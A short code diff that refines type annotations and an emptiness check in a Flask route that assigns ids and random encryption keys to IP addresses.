@@ -12,7 +12,7 @@ app.register_blueprint(encrypt)
 
 
 @app.route('/id_request')
-def get_id() -> dict:
+def get_id() -> Dict[str, int]:
     """
     A route to fetch the id of a given ip address
 
@@ -20,7 +20,7 @@ def get_id() -> dict:
     a dictionary with a key of id, and the ip's corresonding id number
     """
     data_file: str = "data/id.json"
-    data: dict = {}
+    data: Dict[str, Dict[str, any]] = {}
     if(os.path.exists(data_file)):
         with open(data_file, "r") as fp:
             data = json.load(fp)
@@ -34,7 +34,7 @@ def get_id() -> dict:
     else:
 
         # New access, generate an id and random encryption key
-        if len(data) > 0:
+        if data:
             id_number = max(data.values(), key=lambda x: x['id'])['id'] + 1
 
         key: str = ''.join([random.choice(string.ascii_letters)
